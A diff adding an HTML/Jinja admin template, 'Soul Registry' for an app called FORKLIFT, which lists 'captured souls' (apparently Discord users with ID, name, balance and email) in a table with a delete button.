@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Soul Registry</title>
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+                font-family: 'Courier New', monospace;
+                background: linear-gradient(135deg, #1e1e2e, #151515);
+                color: #00ff88;
+                min-height: 100vh;
+            }
+            .nav {
+                background: rgba(0, 0, 0, 0.8);
+                padding: 1rem 2rem;
+                border-bottom: 2px solid #00ff88;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+            }
+            .nav a {
+                color: #00ff88;
+                text-decoration: none;
+                margin: 0 1rem;
+            }
+            .nav a:hover {
+                text-shadow: 0 0 10px #00ff88;
+            }
+            .container {
+                padding: 2rem;
+                max-width: 1400px;
+                margin: 0 auto;
+            }
+            table {
+                width: 100%;
+                background: rgba(0, 0, 0, 0.6);
+                border: 1px solid #00ff88;
+                border-radius: 10px;
+                overflow: hidden;
+            }
+            th, td {
+                padding: 1rem;
+                text-align: left;
+                border-bottom: 1px solid rgba(0, 255, 136, 0.3);
+            }
+            th {
+                background: rgba(0, 255, 136, 0.1);
+            }
+            tr:hover {
+                background: rgba(0, 255, 136, 0.05);
+            }
+            .btn-delete {
+                background: #ff4444;
+                color: #fff;
+                border: none;
+                padding: 0.25rem 0.5rem;
+                border-radius: 3px;
+                cursor: pointer;
+            }
+            .btn-delete:hover {
+                background: #ff6666;
+            }
+            h1 {
+                text-shadow: 0 0 20px #00ff88;
+                margin-bottom: 2rem;
+            }
+            
+        </style>
+    </head>
+    <body>
+        <nav class="nav">
+            <div>
+                <span style="font-size: 1.5rem;">⚡ FORKLIFT</span>
+            </div>
+            <div>
+                <a href="/dashboard">Dashboard</a>
+                <a href="/souls">Soul Registry</a>
+                <a href="/logout">Logout</a>
+            </div>
+        </nav>
+        <div class="container">
+            <h1>Captured Souls</h1>
+            
+            <table>
+                <thead>
+                    <tr>
+                        <th>Discord ID</th>
+                        <th>Name</th>
+                        <th>Balance</th>
+                        <th>Email</th>
+                        <th>Captured</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for soul in souls %}
+                    <tr>
+                        <td>{{ soul.discord_id }}</td>
+                        <td>{{ soul.discord_name }}</td>
+                        <td>{{ "{:,}".format(soul.balance) }}</td>
+                        <td>{{ soul.email or 'N/A' }}</td>
+                        <td>{{ soul.created_at }}</td>
+                        <td>
+                            <button class="btn-delete" onclick="deleteSoul('{{ soul.discord_id }}')">Delete</button>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+
+        <script>
+            function deleteSoul(id) {
+                if(confirm('Release this soul?')) {
+                    fetch(`/api/souls/${id}`, {method: 'DELETE'})
+                        .then(() => location.reload());
+                }
+            }
+        </script>
+    </body>
+</html>
